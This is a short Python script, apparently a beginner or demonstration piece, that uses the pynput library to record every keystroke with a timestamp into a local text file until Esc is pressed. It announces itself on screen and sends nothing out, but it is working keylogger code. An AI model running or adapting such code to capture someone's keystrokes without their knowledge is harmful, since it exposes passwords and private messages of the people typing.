from pynput import keyboard
from datetime import datetime

# Log file path
log_file = "key_log.txt"
start_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

print("Keylogging Started. Press 'Esc' to stop");

# Write session start to log file
with open(log_file, "a") as f:
    f.write(f"\n\n=== Logging Started: {start_time} ===\n")

# Define what to do on key press
def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{datetime.now()} - {key.char}\n")
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f"{datetime.now()} - {key}\n")

    # Stop the listener if ESC is pressed
    if key == keyboard.Key.esc:
        print("[+] Escape key pressed. Stopping keylogger.")
        return False  # This will stop the listener

# Start the keyboard listener
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
